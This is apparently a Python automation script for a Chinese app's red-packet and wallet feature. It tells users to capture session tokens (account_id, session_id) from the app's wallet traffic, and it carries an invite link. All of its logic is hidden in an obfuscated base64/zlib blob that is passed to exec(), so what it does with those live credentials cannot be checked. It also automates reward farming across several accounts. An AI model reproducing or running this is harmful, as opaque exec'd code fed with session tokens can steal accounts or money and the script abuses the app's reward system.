"""

time: 2023.6.25
cron: 2 10 * * *
new Env('歌画东阳');
地址：https://app.tmuyun.com/webChannels/invite?inviteCode=BRHAB9&tenantId=49&accountId=6448adf9c790b07c90ca2591
进入app-我的-抢红包或者在我的钱包-提现进去之后抓包
提前在我的钱包里面绑定zfb号
抓包域名: fijdzpur.act.tmuact.com 或者 wallet.act.tmuact.com
抓包请求体里面: account_id和session_id的值 或者 X-ACCOUNT-ID和X-SESSION-ID
环境变量名称：bd_ghdy = account_id的值#session_id的值  注：用'#'号分开两个参数，顺序不要乱，先是account_id的值然后session_id的值
多账号新建变量或者用 & 分开

"""
import zlib, base64

exec(zlib.decompress(base64.b64decode(
    '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')))